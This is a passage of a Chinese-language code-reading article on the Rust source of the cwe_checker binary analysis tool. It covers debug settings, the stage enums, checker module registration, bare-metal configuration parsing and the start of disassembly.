punctuation">,</span><span class="token comment">// 没有指定 --debug 参数则使用默认值（不调试）</span>            <span class="token comment">// 如果用户指定了 --debug 参数，则将 CliDebugMode 转换为 debug::Stage</span>            <span class="token comment">// mode.into() 会调用 impl From&lt;&amp;CliDebugMode> for debug::Stage 的 from 方法</span>            <span class="token class-name">Some</span><span class="token punctuation">(</span>mode<span class="token punctuation">)</span> <span class="token operator">=></span> mode<span class="token punctuation">.</span><span class="token function">into</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>                <span class="token comment">// 处理 verbose 参数：确定日志详细程度，检查用户是否指定了 --verbose 或 --quiet 参数</span>        <span class="token keyword">let</span> verbosity <span class="token operator">=</span> <span class="token keyword">if</span> args<span class="token punctuation">.</span>verbose <span class="token punctuation">&#123;</span>            <span class="token namespace">debug<span class="token punctuation">::</span></span><span class="token class-name">Verbosity</span><span class="token punctuation">::</span><span class="token class-name">Verbose</span><span class="token comment">// 如果指定了 --verbose，使用详细模式（打印所有调试信息）</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> args<span class="token punctuation">.</span>quiet <span class="token punctuation">&#123;</span>            <span class="token namespace">debug<span class="token punctuation">::</span></span><span class="token class-name">Verbosity</span><span class="token punctuation">::</span><span class="token class-name">Quiet</span><span class="token comment">// 如果指定了 --quiet，使用静默模式（不打印日志）</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token namespace">debug<span class="token punctuation">::</span></span><span class="token class-name">Verbosity</span><span class="token punctuation">::</span><span class="token function">default</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">// 如果两个都没指定，使用默认模式（正常日志）</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token comment">// 构建 Settings 对象：调用 SettingsBuilder::default() 创建建造者，设置默认值</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> builder <span class="token operator">=</span> <span class="token namespace">debug<span class="token punctuation">::</span></span><span class="token class-name">SettingsBuilder</span><span class="token punctuation">::</span><span class="token function">default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">set_stage</span><span class="token punctuation">(</span>stage<span class="token punctuation">)</span>           <span class="token comment">// 设置调试阶段（调用图、IR 等）</span>            <span class="token punctuation">.</span><span class="token function">set_verbosity</span><span class="token punctuation">(</span>verbosity<span class="token punctuation">)</span><span class="token comment">// 设置日志详细程度（verbose/quiet/normal）</span>            <span class="token punctuation">.</span><span class="token function">set_termination_policy</span><span class="token punctuation">(</span><span class="token namespace">debug<span class="token punctuation">::</span></span><span class="token class-name">TerminationPolicy</span><span class="token punctuation">::</span><span class="token class-name">EarlyExit</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 设置调试后退出</span>        <span class="token comment">// 处理 --pcode-raw 参数：可选地设置保存的 Pcode 文件路径</span>        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>pcode_raw<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>args<span class="token punctuation">.</span>pcode_raw <span class="token punctuation">&#123;</span>            <span class="token comment">// 将字符串路径转换为 PathBuf，并设置到建造者中</span>            <span class="token comment">// 这样可以从保存的文件读取 Pcode，而不需要调用 Ghidra</span>            builder <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">set_saved_pcode_raw</span><span class="token punctuation">(</span><span class="token class-name">PathBuf</span><span class="token punctuation">::</span><span class="token function">from</span><span class="token punctuation">(</span>pcode_raw<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 调用 build() 方法构建最终的 Settings 对象，返回一个完整的 debug::Settings 结构体</span>        builder<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>示例：</p><p>转换前：</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token class-name">CmdlineArgs</span> <span class="token punctuation">&#123;</span>binary<span class="token punctuation">:</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token string">"binary"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>config<span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">,</span>out<span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">,</span>partial<span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">,</span>json<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>quiet<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>verbose<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>statistics<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>bare_metal_config<span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">,</span>module_versions<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>debug<span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">,</span>           <span class="token comment">// ← 没有指定 --debug</span>pcode_raw<span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">,</span>cfg_stats<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>转换后：</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token namespace">debug<span class="token punctuation">::</span></span><span class="token class-name">Settings</span> <span class="token punctuation">&#123;</span>stage<span class="token punctuation">:</span> <span class="token class-name">Stage</span><span class="token punctuation">::</span><span class="token class-name">No</span><span class="token punctuation">,</span>                                     <span class="token comment">// 不调试</span>verbose<span class="token punctuation">:</span> <span class="token class-name">Verbosity</span><span class="token punctuation">::</span><span class="token class-name">Normal</span><span class="token punctuation">,</span>                           <span class="token comment">// 正常日志</span>terminate<span class="token punctuation">:</span> <span class="token class-name">TerminationPolicy</span><span class="token punctuation">::</span><span class="token class-name">EarlyExit</span><span class="token punctuation">,</span>              <span class="token comment">// 调试后退出</span>saved_pcode_raw<span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">,</span>                                <span class="token comment">// 不使用保存的文件</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>debug 相关函数位于 src\cwe_checker_lib\src\utils\debug.rs</p><ul><li><p>Stage 类型：</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#[derive(PartialEq, Eq, Copy, Clone, Debug, Default)]</span><span class="token attribute attr-name">#[non_exhaustive]</span><span class="token keyword">pub</span> <span class="token keyword">enum</span> <span class="token type-definition class-name">Stage</span> <span class="token punctuation">&#123;</span>    <span class="token attribute attr-name">#[default]</span>    <span class="token class-name">No</span><span class="token punctuation">,</span><span class="token comment">// 默认值，无阶段</span>    <span class="token class-name">All</span><span class="token punctuation">,</span><span class="token comment">// 全部阶段</span>    <span class="token class-name">CallGraph</span><span class="token punctuation">,</span>     <span class="token comment">// 构建调用图</span>    <span class="token class-name">ControlFlowGraph</span><span class="token punctuation">,</span> <span class="token comment">// 构建控制流图</span>    <span class="token class-name">Pi</span><span class="token punctuation">,</span><span class="token comment">// 指针推理</span>    <span class="token class-name">Ir</span><span class="token punctuation">(</span><span class="token class-name">IrForm</span><span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token comment">// 生成中间表示</span>    <span class="token class-name">Pcode</span><span class="token punctuation">(</span><span class="token class-name">PcodeForm</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// 解析 Pcode</span>    <span class="token class-name">Cwe</span><span class="token punctuation">,</span>    <span class="token comment">// CWE 检查阶段</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中 IrForm 类型（生成中间表示的子阶段）：</p></li></ul><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#[derive(PartialEq, Eq, Copy, Clone, Debug)]</span><span class="token attribute attr-name">#[non_exhaustive]</span><span class="token keyword">pub</span> <span class="token keyword">enum</span> <span class="token type-definition class-name">IrForm</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Early</span><span class="token punctuation">,</span> <span class="token comment">// 程序的第一个 IR 表示</span>    <span class="token class-name">SingleTargetIndirectCallsReplaced</span><span class="token punctuation">,</span> <span class="token comment">// 单目标间接调用已被替换为直接调用</span>    <span class="token class-name">FnBlksSorted</span><span class="token punctuation">,</span> <span class="token comment">// 函数内基本块已正常排序后</span>    <span class="token class-name">NonRetExtFunctionsMarked</span><span class="token punctuation">,</span> <span class="token comment">// 非返回外部函数已标记后</span>    <span class="token class-name">ExtCallsReplaced</span><span class="token punctuation">,</span> <span class="token comment">// 外部函数存根调用已替换为外部函数调用后</span>    <span class="token class-name">Inlined</span><span class="token punctuation">,</span> <span class="token comment">// 现有引用块已内联到函数中后</span>    <span class="token class-name">SubregistersSubstituted</span><span class="token punctuation">,</span> <span class="token comment">// 子寄存器替换过程后</span>    <span class="token class-name">CfPatched</span><span class="token punctuation">,</span> <span class="token comment">// 所有控制流转换都有有效目标后</span>    <span class="token class-name">EmptyFnRemoved</span><span class="token punctuation">,</span> <span class="token comment">// 空函数已被移除后</span>    <span class="token class-name">EntryPointsExist</span><span class="token punctuation">,</span> <span class="token comment">// 不存在的入口点已被移除后</span>    <span class="token class-name">Raw</span><span class="token punctuation">,</span> <span class="token comment">// 未优化的 IR</span>    <span class="token class-name">IntraproceduralDeadBlocksElimed</span><span class="token punctuation">,</span> <span class="token comment">// 函数中不可达基本块已被移除后</span>    <span class="token class-name">TrivialExpressionsSubstituted</span><span class="token punctuation">,</span> <span class="token comment">// 平凡表达式已替换为其结果后</span>    <span class="token class-name">InputExpressionsPropagated</span><span class="token punctuation">,</span> <span class="token comment">// 输入表达式已沿变量赋值传播后</span>    <span class="token class-name">DeadVariablesElimed</span><span class="token punctuation">,</span> <span class="token comment">// 死变量赋值已被移除后</span>    <span class="token class-name">ControlFlowPropagated</span><span class="token punctuation">,</span> <span class="token comment">// 具有相同条件的条件语句的控制流已简化后</span>    <span class="token class-name">StackPointerAlignmentSubstituted</span><span class="token punctuation">,</span> <span class="token comment">// 栈指针通过逻辑 AND 对齐已替换为减法操作后</span>    <span class="token class-name">Optimized</span><span class="token punctuation">,</span> <span class="token comment">// 最终优化的 IR</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>PcodeForm：pcode 解析子阶段</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#[derive(PartialEq, Eq, Copy, Clone, Debug)]</span><span class="token attribute attr-name">#[non_exhaustive]</span><span class="token keyword">pub</span> <span class="token keyword">enum</span> <span class="token type-definition class-name">PcodeForm</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Raw</span><span class="token punctuation">,</span><span class="token comment">// 从 ghidra 获取的初始数据</span>    <span class="token class-name">Parsed</span><span class="token punctuation">,</span><span class="token comment">// 转化成 rust 类型的数据</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>Verbosity 类型：</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#[derive(PartialEq, Eq, Copy, Clone, Debug, Default)]</span><span class="token attribute attr-name">#[non_exhaustive]</span><span class="token keyword">pub</span> <span class="token keyword">enum</span> <span class="token type-definition class-name">Verbosity</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Quiet</span><span class="token punctuation">,</span><span class="token comment">// 静默模式</span>    <span class="token attribute attr-name">#[default]</span>    <span class="token class-name">Normal</span><span class="token punctuation">,</span><span class="token comment">// 默认的正常模式</span>    <span class="token class-name">Verbose</span><span class="token punctuation">,</span><span class="token comment">// 打印额外日志信息</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>TerminationPolicy 类型：调试完成后的操作</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#[derive(PartialEq, Eq, Copy, Clone, Debug, Default)]</span><span class="token attribute attr-name">#[non_exhaustive]</span><span class="token keyword">pub</span> <span class="token keyword">enum</span> <span class="token type-definition class-name">TerminationPolicy</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">KeepRunning</span><span class="token punctuation">,</span><span class="token comment">// 继续运行</span>    <span class="token attribute attr-name">#[default]</span>    <span class="token class-name">EarlyExit</span><span class="token punctuation">,</span><span class="token comment">// 默认提前退出</span>    <span class="token class-name">Panic</span><span class="token punctuation">,</span><span class="token comment">// 异常终止</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>获取每个模块的 CweModule 结构体</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">let</span> <span class="token keyword">mut</span> modules <span class="token operator">=</span> <span class="token namespace">cwe_checker_lib<span class="token punctuation">::</span>checkers<span class="token punctuation">::</span></span><span class="token function">get_modules</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>get_modules 位于 src\cwe_checker_lib\src\checkers.rs：</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">get_modules</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token operator">&amp;</span><span class="token lifetime-annotation symbol">'static</span> <span class="token class-name">CweModule</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>    <span class="token macro property">vec!</span><span class="token punctuation">[</span>        <span class="token operator">&amp;</span><span class="token keyword">crate</span><span class="token module-declaration namespace"><span class="token punctuation">::</span>checkers<span class="token punctuation">::</span>cwe_78<span class="token punctuation">::</span></span><span class="token constant">CWE_MODULE</span><span class="token punctuation">,</span>        <span class="token operator">&amp;</span><span class="token keyword">crate</span><span class="token module-declaration namespace"><span class="token punctuation">::</span>checkers<span class="token punctuation">::</span>cwe_119<span class="token punctuation">::</span></span><span class="token constant">CWE_MODULE</span><span class="token punctuation">,</span>        <span class="token operator">&amp;</span><span class="token keyword">crate</span><span class="token module-declaration namespace"><span class="token punctuation">::</span>checkers<span class="token punctuation">::</span>cwe_134<span class="token punctuation">::</span></span><span class="token constant">CWE_MODULE</span><span class="token punctuation">,</span>        <span class="token operator">&amp;</span><span class="token keyword">crate</span><span class="token module-declaration namespace"><span class="token punctuation">::</span>checkers<span class="token punctuation">::</span>cwe_190<span class="token punctuation">::</span></span><span class="token constant">CWE_MODULE</span><span class="token punctuation">,</span>        <span class="token operator">&amp;</span><span class="token keyword">crate</span><span class="token module-declaration namespace"><span class="token punctuation">::</span>checkers<span class="token punctuation">::</span>cwe_215<span class="token punctuation">::</span></span><span class="token constant">CWE_MODULE</span><span class="token punctuation">,</span>        <span class="token operator">&amp;</span><span class="token keyword">crate</span><span class="token module-declaration namespace"><span class="token punctuation">::</span>checkers<span class="token punctuation">::</span>cwe_243<span class="token punctuation">::</span></span><span class="token constant">CWE_MODULE</span><span class="token punctuation">,</span>        <span class="token operator">&amp;</span><span class="token keyword">crate</span><span class="token module-declaration namespace"><span class="token punctuation">::</span>checkers<span class="token punctuation">::</span>cwe_252<span class="token punctuation">::</span></span><span class="token constant">CWE_MODULE</span><span class="token punctuation">,</span>        <span class="token operator">&amp;</span><span class="token keyword">crate</span><span class="token module-declaration namespace"><span class="token punctuation">::</span>checkers<span class="token punctuation">::</span>cwe_332<span class="token punctuation">::</span></span><span class="token constant">CWE_MODULE</span><span class="token punctuation">,</span>        <span class="token operator">&amp;</span><span class="token keyword">crate</span><span class="token module-declaration namespace"><span class="token punctuation">::</span>checkers<span class="token punctuation">::</span>cwe_337<span class="token punctuation">::</span></span><span class="token constant">CWE_MODULE</span><span class="token punctuation">,</span>        <span class="token operator">&amp;</span><span class="token keyword">crate</span><span class="token module-declaration namespace"><span class="token punctuation">::</span>checkers<span class="token punctuation">::</span>cwe_367<span class="token punctuation">::</span></span><span class="token constant">CWE_MODULE</span><span class="token punctuation">,</span>        <span class="token operator">&amp;</span><span class="token keyword">crate</span><span class="token module-declaration namespace"><span class="token punctuation">::</span>checkers<span class="token punctuation">::</span>cwe_416<span class="token punctuation">::</span></span><span class="token constant">CWE_MODULE</span><span class="token punctuation">,</span>        <span class="token operator">&amp;</span><span class="token keyword">crate</span><span class="token module-declaration namespace"><span class="token punctuation">::</span>checkers<span class="token punctuation">::</span>cwe_426<span class="token punctuation">::</span></span><span class="token constant">CWE_MODULE</span><span class="token punctuation">,</span>        <span class="token operator">&amp;</span><span class="token keyword">crate</span><span class="token module-declaration namespace"><span class="token punctuation">::</span>checkers<span class="token punctuation">::</span>cwe_467<span class="token punctuation">::</span></span><span class="token constant">CWE_MODULE</span><span class="token punctuation">,</span>        <span class="token operator">&amp;</span><span class="token keyword">crate</span><span class="token module-declaration namespace"><span class="token punctuation">::</span>checkers<span class="token punctuation">::</span>cwe_476<span class="token punctuation">::</span></span><span class="token constant">CWE_MODULE</span><span class="token punctuation">,</span>        <span class="token operator">&amp;</span><span class="token keyword">crate</span><span class="token module-declaration namespace"><span class="token punctuation">::</span>checkers<span class="token punctuation">::</span>cwe_560<span class="token punctuation">::</span></span><span class="token constant">CWE_MODULE</span><span class="token punctuation">,</span>        <span class="token operator">&amp;</span><span class="token keyword">crate</span><span class="token module-declaration namespace"><span class="token punctuation">::</span>checkers<span class="token punctuation">::</span>cwe_676<span class="token punctuation">::</span></span><span class="token constant">CWE_MODULE</span><span class="token punctuation">,</span>        <span class="token operator">&amp;</span><span class="token keyword">crate</span><span class="token module-declaration namespace"><span class="token punctuation">::</span>checkers<span class="token punctuation">::</span>cwe_782<span class="token punctuation">::</span></span><span class="token constant">CWE_MODULE</span><span class="token punctuation">,</span>        <span class="token operator">&amp;</span><span class="token keyword">crate</span><span class="token module-declaration namespace"><span class="token punctuation">::</span>checkers<span class="token punctuation">::</span>cwe_789<span class="token punctuation">::</span></span><span class="token constant">CWE_MODULE</span><span class="token punctuation">,</span>        <span class="token operator">&amp;</span><span class="token keyword">crate</span><span class="token module-declaration namespace"><span class="token punctuation">::</span>analysis<span class="token punctuation">::</span>pointer_inference<span class="token punctuation">::</span></span><span class="token constant">CWE_MODULE</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同文件中定义了 CweModule 结构体，包括模块名、模块版本、函数名</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">struct</span> <span class="token type-definition class-name">CweModule</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">pub</span> name<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token lifetime-annotation symbol">'static</span> <span class="token keyword">str</span><span class="token punctuation">,</span>    <span class="token keyword">pub</span> version<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token lifetime-annotation symbol">'static</span> <span class="token keyword">str</span><span class="token punctuation">,</span>    <span class="token keyword">pub</span> run<span class="token punctuation">:</span> <span class="token class-name">CweModuleFn</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在每个 CWE 的 mod.rs 中都会设置该结构体，例如</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token macro property">cwe_module!</span><span class="token punctuation">(</span><span class="token string">"CWE119"</span><span class="token punctuation">,</span> <span class="token string">"0.3"</span><span class="token punctuation">,</span> check_cwe<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>打印每个模块的版本信息：</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">if</span> args<span class="token punctuation">.</span>module_versions <span class="token punctuation">&#123;</span>                                                           <span class="token comment">// 仅打印模块版本然后退出</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"[cwe_checker] module_versions:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> module <span class="token keyword">in</span> modules<span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;module&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>将 bare_metal_config 指定路径的 json 文件转化为 BareMetalConfig 结构体</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">let</span> bare_metal_config_opt<span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">BareMetalConfig</span><span class="token operator">></span> <span class="token operator">=</span>        args<span class="token punctuation">.</span>bare_metal_config<span class="token punctuation">.</span><span class="token function">as_ref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>config_path<span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span>            <span class="token keyword">let</span> file <span class="token operator">=</span> <span class="token namespace">std<span class="token punctuation">::</span>io<span class="token punctuation">::</span></span><span class="token class-name">BufReader</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token namespace">std<span class="token punctuation">::</span>fs<span class="token punctuation">::</span></span><span class="token class-name">File</span><span class="token punctuation">::</span><span class="token function">open</span><span class="token punctuation">(</span>config_path<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token namespace">serde_json<span class="token punctuation">::</span></span><span class="token function">from_reader</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">expect</span><span class="token punctuation">(</span><span class="token string">"Parsing of the bare metal configuration file failed"</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>BareMetalConfig 结构体位于 src\cwe_checker_lib\src\utils\binary.rs</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">struct</span> <span class="token type-definition class-name">BareMetalConfig</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">pub</span> processor_id<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span><span class="token comment">// 指定 CPU 类型</span>    <span class="token keyword">pub</span> flash_base_address<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span>  <span class="token comment">// Flash 起始地址（程序代码）</span>    <span class="token keyword">pub</span> ram_base_address<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span><span class="token comment">// RAM 起始地址（数据、堆栈）</span>    <span class="token keyword">pub</span> ram_size<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span>   <span class="token comment">// RAM 大小</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>bare_metal_config 配置文件示例</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"_comment"</span><span class="token operator">:</span> <span class="token string">"The CPU architecture of the chip. Valid values are those that Ghidra accepts as processor IDs."</span><span class="token punctuation">,</span>    <span class="token property">"processor_id"</span><span class="token operator">:</span> <span class="token string">"ARM:LE:32:v8"</span><span class="token punctuation">,</span>    <span class="token property">"_comment_1"</span><span class="token operator">:</span> <span class="token string">"The base address, where the contents of the binary would be mapped on the chip, as a hexadecimal number."</span><span class="token punctuation">,</span>    <span class="token property">"flash_base_address"</span><span class="token operator">:</span> <span class="token string">"0x08000000"</span><span class="token punctuation">,</span>    <span class="token property">"_comment_2"</span><span class="token operator">:</span> <span class="token string">"The base address, of the RAM memory region as a hexadecimal number."</span><span class="token punctuation">,</span>    <span class="token property">"ram_base_address"</span><span class="token operator">:</span> <span class="token string">"0x20000000"</span><span class="token punctuation">,</span>    <span class="token property">"_comment_3"</span><span class="token operator">:</span> <span class="token string">"The size of the RAM memory region (in bytes) as a hexadecimal number."</span><span class="token punctuation">,</span>    <span class="token property">"ram_size"</span><span class="token operator">:</span> <span class="token string">"0x00030000"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>区别：</p><pre class="line-numbers language-none"><code class="language-none">普通程序内存布局：逻辑程序内存布局：0x08048000 ──────┐0x08000000 ──────┐                 │ .text (代码段)                    │ Flash (整个二进制)0x0804A000 ──────┼0x08020000 ──────┼                 │ .data (数据段)                      │ RAM (数据区)0x0804B000 ──────┼0x08022000 ──────┘                 │ .bss (BSS段)                 │0x0804C000 ──────┘<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>获取二进制文件路径</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">let</span> binary_file_path <span class="token operator">=</span> <span class="token class-name">PathBuf</span><span class="token punctuation">::</span><span class="token function">from</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>binary<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>反编译二进制文件：将二进制文件路径、配置文件路径、debug 设置传递给 disassemble_binary 函数（位于 <a href="###src%5Ccwe_checker_lib%5Csrc%5Cpipeline%5Cmod.rs">src\cwe_checker_lib\src\pipeline\mod.rs</a>），返回二进制程序字节形式的文件内容（bianry）和 Project 结构体（project）</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">let</span> <span class="token punctuation">(</span>binary<span class="token punctuation">,</span> project<span class="token punctuation">)</span> <span class="token operator">=</span>    <span class="token function">disassemble_binary</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>binary_file_path<span class="token punctuation">,</span> bare_metal_config_opt<span class="token punctuation">,</span> <span class="token operator">&amp;</span>debug_settings<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其中 Project 结构体如下（位于 cwe_checker_lib\src\intermediate_representation\project.rs），该结构体是一个用于表示二进制文件的主要数据，包含反编译后的信息、执行环境等</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#[derive(Serialize, Deserialize, Debug, PartialEq, Eq, Clone)]</span><span class="token keyword">pub</span> <span class="token keyword">struct</span> <span class="token type-definition class-name">Project</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">pub</span> program<span class="token punctuation">:</span> <span class="token class-name">Term</span><span class="token operator">&lt;</span><span class="token class-name">Program</span><span class="token operator">></span><span class="token punctuation">,</span>    <span class="token comment">// 二进制文件中所有已知可执行代码（反汇编后的程序）</span>    <span class="token keyword">pub</span> cpu_architecture<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span>    <span class="token comment">// 